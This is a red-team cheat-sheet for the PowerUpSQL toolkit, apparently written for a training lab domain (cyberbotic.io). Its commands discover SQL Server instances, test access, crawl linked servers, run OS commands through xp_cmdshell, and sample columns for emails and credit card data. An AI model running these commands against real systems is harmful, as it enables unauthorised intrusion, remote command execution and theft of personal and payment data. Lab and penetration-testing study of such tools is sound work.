[GitHub Link](https://github.com/NetSPI/PowerUpSQL)

## Import

---

```
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
```


## Notes

---

If there are multiple SQL Servers available, you can chain these commands together to automate the data collection.

```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```


## Enumerate SQL Instance Domain

---

`Get-SQLInstanceDomain` works by searching for SPNs that begin with _MSSQL*_.

```
powershell Get-SQLInstanceDomain
powershell Get-SQLInstanceBroadcast
powershell Get-SQLInstanceScanUDP
```

You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group). [[ADSearch#Get All Domain Groups That Ends with "admins"]]


## Get-SQLConnectionTest

---

Tests the connection to an SQL server instance.

```
powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
```


## Get-SQLServerInfo

---

Gathers even more information about an SQL server instance.

```
powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
```


## Get-SQLQuery

---

Sends a query to the SQL server instance.

```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
```

### Search Keywords in SQL Links

Searches for a keyword in SQL links with a query.

```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
```


## Invoke-SQLOSCmd

---

```
powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

It will automatically attempt to enable xp_cmdshell if it's not already, execute the given command, and then disable it again.


## Get-SQLServerLinkCrawl

---

Crawls all available SQL links.

```
powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
```


## Get-SQLColumnSampleDataThreaded

---

It can search one or more instances for databases that contain particular keywords in the column names.

```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
